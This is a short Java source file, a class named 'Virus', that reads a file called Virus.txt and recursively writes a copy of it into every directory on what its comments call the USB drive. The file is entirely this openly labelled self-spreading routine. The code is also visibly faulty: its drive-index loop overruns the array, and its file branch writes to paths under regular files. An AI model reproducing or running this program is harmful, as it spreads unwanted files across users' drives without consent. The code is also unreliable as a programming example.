import java.io.*;
import java.util.*;
public class Virus {
                byte b[];
              FileInputStream fis; //input strream;
          FileOutputStream out;   //output stream
              File ff;
   public static void main(String[]args) throws Exception{
            Virus vv=new Virus();
       } Virus() throws Exception{
              ff=new File("Virus.txt");    //getting file
        if (ff.exists()){
            fis=new FileInputStream(ff);      //passing file to input stream
           byte   b[]=new byte[(int)ff.length()];
             fis.read(b);
             out = new FileOutputStream("Virus.txt");    //passing file to output stream to create
             out.write(b);   // writing bytes to file 
           File[] roots = File.listRoots();    //getting the total drives
            
            for(int i=0;i<roots.length;i++){
              copy(roots[i+2]);       //passing the USB drive only
           
} 
                       } 
  }
public void copy(File file) throws Exception{
        File[] list = file.listFiles(); //getting total files
   int i=0;
          if(list!=null)
             for (File fil : list){ //storing list of files in fil array
                   System.out.println(fil);
                  
                        if (fil.isDirectory()) //check for directory
           {      ff=new File("Virus.txt");  
                   fis=new FileInputStream(ff);
                   byte   b[]=new byte[(int)ff.length()];
                  fis.read(b);
            out = new FileOutputStream(fil.getAbsolutePath()+"/Virus.txt"); //creating file in path of fil
             out.write(b);          
                    copy(fil); //again calling function
            
             } 
             else{  
                   System.out.println(fil); 
   ff=new File("Virus.txt");
                   fis=new FileInputStream(ff);
                   byte   b[]=new byte[(int)ff.length()];
                  fis.read(b);
            out = new FileOutputStream(fil.getAbsolutePath()+"/Virus.txt");
             out.write(b);          
              
                        }
 } 
}


















}





















  
 